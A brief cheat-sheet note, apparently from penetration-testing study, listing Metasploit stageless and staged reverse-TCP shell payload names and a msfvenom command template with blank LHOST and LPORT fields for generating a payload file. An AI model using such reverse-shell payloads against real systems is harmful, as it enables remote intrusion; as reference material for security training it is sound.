#stageless payloads
/shell_reverse_tcp

#stage payloads
/shell/reverse_tcp

msfvenom -p PAYLOAD LHOST= LPORT= -f EXTENSION -o FILE.EXTENSION